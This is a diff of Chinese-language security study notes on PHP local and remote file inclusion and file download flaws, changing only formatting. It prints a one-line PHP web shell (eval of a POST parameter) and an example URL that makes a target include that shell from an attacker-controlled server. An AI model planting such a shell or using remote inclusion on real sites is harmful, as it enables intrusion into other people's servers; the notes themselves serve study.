@@ -13,7 +13,9 @@ cover:
 ---
 # 0x00相关概念
 代码执行：
+
 **本地包含**：攻击者通过构造路径，读取服务器上的敏感文件（如配置文件、日志文件）。
+
 利用：
 - 有文件利用：上传一个文件 文件写有我们构造好的恶意代码（配合上传）
 - 无文件利用：
@@ -21,7 +23,9 @@ cover:
 				2、包含session文件利用
 				3、伪协议利用
 
-**远程包含**：当PHP配置中`allow_url_include`和`allow_url_fopen`开启时，攻击者可加载远程恶意脚本。示例：
+**远程包含**：当PHP配置中`allow_url_include`和`allow_url_fopen`开启时，攻击者可加载远程恶意脚本。
+
+示例：
 上传一个 `1.txt` 内容为一句话木马在自己服务器：
 ```php
 <?php eval($_POST[1]);?>
@@ -34,6 +38,7 @@ http://xxx.com/include.php?file=http://your vps.com/1.txt
 
 # 文件安全-下载&删除-黑白盒
 1、下载=读取
+
 常规下载URL：http://www.xxx.com/upload/123.pdf
 
 可能存在安全URL：http://www.xxx.com/xx.xx?file=123.pdf
